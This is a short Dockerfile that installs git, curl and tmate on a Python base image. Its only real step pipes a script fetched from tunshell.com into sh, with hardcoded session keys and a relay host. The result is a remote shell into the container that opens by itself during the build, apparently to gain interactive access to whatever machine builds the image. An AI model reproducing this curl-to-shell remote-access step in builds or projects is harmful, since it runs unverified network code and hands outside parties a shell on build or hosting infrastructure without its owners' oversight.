FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl tmate -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T y0YVsbiHXH5WpyzjNaezGV DpgQYwaqdabuGtOVaeHkyT eu.relay.tunshell.com
